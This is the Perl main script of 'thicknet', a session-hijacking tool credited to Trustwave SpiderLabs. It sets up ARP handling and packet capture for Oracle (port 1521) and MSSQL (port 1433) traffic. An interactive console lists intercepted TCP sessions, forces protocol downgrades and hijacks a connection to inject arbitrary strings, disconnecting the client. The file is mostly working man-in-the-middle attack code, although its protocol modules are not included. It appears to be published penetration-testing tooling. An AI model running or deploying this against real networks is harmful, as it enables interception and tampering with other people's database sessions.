#!/usr/bin/perl

=header
    thicknet - A tool to manipulate and take control of TCP sessions
	Created by Wendel G. Henrique and Steve Ocepek
	Copyright (C) 2010, 2011 Trustwave Holdings, Inc.
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
=cut

use strict;
use warnings;
use Net::Pcap;
use lib '.';
use AnyEvent;
use Data::HexDump;
use EV;

use thicknet::Util;
use thicknet::packet::MSSQL;
use thicknet::packet::Oracle;
use thicknet::packet::Default;
use thicknet::pcap::ARP;
use thicknet::pcap::Pcap;


# Flush after every write to stdout
local $| = 1;

my $mymac;
my $myip;
my $myhexip;
my $dev;

# Session hash
# key: client:clientport:server:serverport
my $sessions = {};

# Console vars
my @console;
my $context;
my $prompt = "\nthicknet> ";

sub cmdline {
	# Listening interface
	# Specify on command line or prompt
	my %devinfo;
	my $err;
	my $index = 1;
	
	if ($ARGV[0]) {
		$dev = $ARGV[0];
	}
	else {
		# Show available devices, allow user to choose
		# TODO allow int specified on ARGV
		my @devs = Net::Pcap::findalldevs(\%devinfo, \$err);
		if ($devs[0]) {
			print "\n";
			print "Please choose an interface to listen on\n\n";

			for my $d (@devs) {
			    print "$index: $d - $devinfo{$d}\n";
			    $index++;
			}

			print "\n> ";
			my $choice = <STDIN>;
			chomp ($choice);

			$dev = $devs[$choice-1];
		}
		else {
			print "No interfaces found. Ensure that current user has admin/root priveleges.\n";
			exit;
		}
	
	}
}


sub console_inject {
	chomp (my ($input) = @_);
	push (@console, \&console_inject);
	$prompt = "\nthicknet(inject-" . thicknet::Util::session_hex2ip($context) . ") > "; 
	if ($input eq '?') {
		print "Commands:\n\n";
		print "(string)     inject string into session\n";
		print "!!           stop injection\n";
		print "?            help (this page)\n";
		print "\n";
	}
	elsif ($input eq '') {
	}
	elsif ($input eq '!!') {
		$sessions->{$context}->{examine} = 0;
		pop(@console);
		return;
	}
	else {
	    my $res = $sessions->{$context}->inject($input);
		print $res;
	}
	return $prompt;
}

sub console_examine {
	chomp (my ($input) = @_);
	push (@console, \&console_examine); 
	$prompt = "\nthicknet(examine-" . thicknet::Util::session_hex2ip($context) . ") > "; 
	# Menu
	if ($input eq '?') {
		print "Commands:\n\n";
		print "s            toggle packet display\n";
		print "i            hijack connection and begin injection\n";
		print "             (caution: will disconnect client!)\n";
		print "d            enable/disable protocol downgrade\n";
		print "back         go back to higher level menu\n";
		print "?            help (this page)\n";
		print "\n";
	}
	elsif ($input eq 's') {
		if ($sessions->{$context}->{examine}) {
			$sessions->{$context}->{examine} = 0;
			print "Packet display disabled\n";
		}
		else {
			$sessions->{$context}->{examine} = 1;
			print "Packet display enabled\n";
		}
	}
	elsif ($input eq 'i') {
		if ($sessions->{$context}->{sled}) {
			$sessions->{$context}->{examine} = 1;
			console_inject('');
		} else {
			print "Can't inject: sled not captured\n";
		}
	}
	elsif ($input eq 'd') {
	    if ($sessions->{$context}->downgrade()) {
    		my $err = $sessions->{$context}->downgrade(0);
    		if ($err) {
    		    print $err . "\n";
		    } else {
		        print "\nProtocol downgrade disabled\n";
		    }
    	} 
    	else {
    		my $err = $sessions->{$context}->downgrade(1);
    		if ($err) {
    		    print $err . "\n";
		    } else {
		        print "\nProtocol downgrade disabled\n";
		    }
	    }
	}
	elsif ($input eq 'back') {
		$sessions->{$context}->{examine} = 0;
		pop(@console);
		return;
	}
	elsif ($input eq '') {
	}
	elsif (($input eq 'q') or ($input eq 'exit')) {
		exit;
	}
	else {
		print "Unknown command. Type '?' for help.\n";
	}
	return $prompt
}

sub console_root {
	chomp (my ($input) = @_);
	$prompt = "\nthicknet> ";
	if ($input eq '?') {
		print "Commands:\n\n";
		print "ls           list sessions\n";
		print "x (session)  examine session (and possibly inject)\n";
		print "q            quit\n";
		print "?            help (this page)\n";
		print "\n";
	} 
	elsif ($input eq 'ls') {
		print "\n";
		foreach my $session (keys(%{$sessions})) {
			my $string = thicknet::Util::session_hex2ip($session);
			if ($sessions->{$session}->{sled}) {
				$string = $string . " !I";
			}
			print "$string\n";
		}
	}
	elsif ($input eq '') {
	}
	elsif (($input eq 'q') or ($input eq 'exit')) {
		exit;
	}
	elsif ($input =~ /x (\b(?:\d{1,3}\.){3}\d{1,3}\b:\d{1,5}:\b(?:\d{1,3}\.){3}\d{1,3}\b:\d{1,5})/) {
		my $input_session = thicknet::Util::session_ip2hex($1);
		if ($sessions->{$input_session}) {
			$context = $input_session;
			console_examine('');
		}
		else {
			print "Invalid session\n";
		}
	}
	
	else {
		print "Unknown command. Type '?' for help.\n";
	}
	return $prompt;
}

sub console {
	my ($input) = @_;
	my $place = pop(@console);
	if ($place) {
		$prompt = &$place($input);
	} else {
		$prompt = console_root($input);
	}
	if ($prompt) {
		print $prompt;
	} else {
		console('');
	}
}

# Execute

cmdline();

($mymac, $myip, $myhexip) = thicknet::Util::getif($dev);

# User console
my $watcher_cli = AnyEvent->io (fh => \*STDIN, poll => 'r', cb => sub {  
	my $input = <STDIN>;
	console($input);
});

#New stuff

### Default setup ###
### This is the catch-all for packets not handled by the other modules

my $default_pcaph;
sub default_packet {
    my ($user_data, $header, $pkt) = @_;
    my $p = thicknet::packet::Default->new($pkt);
    $p->sref($sessions);
    $p->mymac($mymac);
    $p->pcaph($default_pcaph);
    $p->preprocess();
    $p->process();
    $p->postprocess();
}

my $default_pcap = thicknet::pcap::Pcap->new();
$default_pcap->ip($myip);
$default_pcap->mac($mymac);
$default_pcap->dev($dev);

# Notice that this must be changed when you add a module
# It looks at all traffic except for the packets covered by the other modules
$default_pcap->filter("((tcp and not port 1521 and not port 1433) or udp or icmp) and ether dst $mymac and ip dst not $myip");

# Get back a pcap handler
$default_pcaph = $default_pcap->init();
my $default_timer = AnyEvent->timer (after => 0, interval => .001, cb => sub {
	Net::Pcap::pcap_dispatch($default_pcaph, 1, \&default_packet, "user data");
});
### End Default ###

### Oracle setup ###
my $oracle_pcaph;
sub oracle_packet {
    my ($user_data, $header, $pkt) = @_;
    my $p = thicknet::packet::Oracle->new($pkt);
    $p->sref($sessions);
    $p->mymac($mymac);
    $p->pcaph($oracle_pcaph);
    $p->preprocess();
    $p->process();
    $p->postprocess();
}

my $oracle_pcap = thicknet::pcap::Pcap->new();
$oracle_pcap->ip($myip);
$oracle_pcap->mac($mymac);
$oracle_pcap->dev($dev);
$oracle_pcap->filter("tcp and port 1521 and ether dst $mymac and ip dst not $myip");
# Get back a pcap handler
$oracle_pcaph = $oracle_pcap->init();
my $oracle_timer = AnyEvent->timer (after => 0, interval => .001, cb => sub {
	Net::Pcap::pcap_dispatch($oracle_pcaph, 1, \&oracle_packet, "user data");
});
### End Oracle ###

### MSSQL setup ###
my $mssql_pcaph;
sub mssql_packet {
    my ($user_data, $header, $pkt) = @_;
    my $p = thicknet::packet::MSSQL->new($pkt);
    $p->sref($sessions);
    $p->mymac($mymac);
    $p->pcaph($mssql_pcaph);
    $p->preprocess();
    $p->process();
    $p->postprocess();
}

my $mssql_pcap = thicknet::pcap::Pcap->new();
$mssql_pcap->ip($myip);
$mssql_pcap->mac($mymac);
$mssql_pcap->dev($dev);
$mssql_pcap->filter("tcp and port 1433 and ether dst $mymac and ip dst not $myip");
# Get back a pcap handler
$mssql_pcaph = $mssql_pcap->init();
my $mssql_timer = AnyEvent->timer (after => 0, interval => .001, cb => sub {
	Net::Pcap::pcap_dispatch($mssql_pcaph, 1, \&mssql_packet, "user data");
});
### End MSSQL ###


### ARP cache handler ###
my $watcher_arp = thicknet::pcap::ARP::init (
	dev => $dev,
	myip => $myip,
	mymac => $mymac
	);

print "\nthicknet\n";
print "(c) 2010, 2011 Trustwave Holdings, Inc.\n";
print "Created by Wendel G. Henrique and Steve Ocepek\n";
print "Trustwave SpiderLabs(R)\n";
print $prompt;
EV::loop;
